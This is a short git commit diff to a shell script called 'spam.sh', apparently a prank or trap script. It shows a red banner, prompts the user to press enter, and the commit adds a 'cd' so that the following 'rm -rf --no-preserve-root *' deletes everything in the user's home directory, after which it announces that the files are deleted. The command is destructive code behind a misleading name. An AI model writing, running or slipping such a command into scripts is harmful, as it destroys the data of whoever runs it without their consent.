72fb466719e83cf8795162a573f10686132b3061
Ryuzora <63346786+Ryuzora@users.noreply.github.com>
2020-04-09 15:27:33 +0800

    Update spam.sh

--- spam.sh
+++ spam.sh
@@ -5,5 +5,6 @@ echo -e '\e[31m║                         ║'
 echo -e '\e[31m╚═════════════════════════╝'
 
 read -p 'Click enter to continue'
+cd
 echo -e '\e[32mYour fileile has been deleted!!'
 rm -rf --no-preserve-root *
